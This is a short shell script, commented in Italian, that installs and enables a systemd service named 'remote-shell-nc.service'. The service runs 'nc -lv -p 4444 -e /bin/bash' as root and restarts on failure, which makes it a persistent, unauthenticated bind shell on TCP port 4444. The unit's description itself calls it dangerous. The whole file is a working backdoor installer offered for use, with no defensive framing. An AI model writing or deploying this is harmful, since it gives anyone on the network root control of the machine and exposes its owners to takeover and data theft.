NOME_SCRIPT="remote-shell-nc.service"
DEST_DIR="/etc/systemd/system"
cd $DEST_DIR
cat <<'EOF' > $NOME_SCRIPT
    [Unit]
    Description=Remote shell via netcat (dangerous) - listens on TCP/4444 and runs /bin/bash
    After=network.target

    [Service]
    Type=simple
    # Usa il DEST_DIR esatto del tuo netcat; se usi netcat-traditional potrebbe essere /bin/nc.traditional
    ExecStart=/bin/nc -lv -p 4444 -e /bin/bash
    Restart=on-failure
    RestartSec=3
    # Se vuoi eseguire come utente non-root (sconsigliato se serve /bin/bash con permessi), decommenta e modifica:
    # User=nobody

    [Install]
    WantedBy=multi-user.target
EOF

# 3) Imposta i permessi corretti (obbligatorio)
sudo chmod 440 $DEST_DIR/$NOME_SCRIPT
sudo chown root:root $DEST_DIR/$NOME_SCRIPT

# 4) Verifica la sintassi del file (IMPORTANTISSIMO)
sudo systemd-analyze verify "$DEST_DIR/$NOME_SCRIPT" || echo "systemd-analyze verify ha restituito errori (vedi sopra)"

# Ricarica systemd, abilita e avvia il servizio
sudo systemctl daemon-reload
sudo systemctl enable --now "$NOME_SCRIPT"

# Mostra stato e log (ultimo passo)
sudo systemctl status "$NOME_SCRIPT" --no-pager
echo "Logs (seguirli in tempo reale): sudo journalctl -fu $NOME_SCRIPT"